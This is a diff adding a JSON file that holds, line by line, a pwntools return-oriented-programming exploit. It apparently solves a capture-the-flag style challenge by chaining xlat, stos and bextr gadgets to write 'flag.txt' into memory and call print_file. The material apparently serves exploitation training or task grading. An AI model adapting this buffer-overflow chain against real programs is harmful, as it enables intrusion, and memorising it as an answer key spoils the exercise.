@@ -1,0 +1,30 @@
+```json
+{
+  "body_lines": [
+    "p = process([str(binary_path)], cwd=str(runtime_dir))",
+    "pop_rdi = 0x4006a3",
+    "clear_eax = 0x400610",
+    "pop_rdx_rcx_bextr = 0x40062a",
+    "xlat = 0x400628",
+    "stos = 0x400639",
+    "bss = elf.bss() + 0x10",
+    "payload = b'A' * 40",
+    "payload += p64(clear_eax) + p64(0)",
+    "payload += p64(pop_rdi) + p64(bss)",
+    "current_al = 0",
+    "for c in b'flag.txt':",
+    "    addr = next(elf.search(bytes([c])))",
+    "    rbx_val = (addr - current_al) & 0xffffffffffffffff",
+    "    rcx_val = (rbx_val - 0x3ef2) & 0xffffffffffffffff",
+    "    payload += p64(pop_rdx_rcx_bextr) + p64(0x4000) + p64(rcx_val)",
+    "    payload += p64(xlat)",
+    "    payload += p64(stos)",
+    "    current_al = c",
+    "payload += p64(pop_rdi) + p64(bss)",
+    "payload += p64(elf.symbols['print_file'])",
+    "p.recvuntil(b'> ')",
+    "p.sendline(payload)",
+    "print(p.recvall().decode('latin-1'))"
+  ]
+}
+```
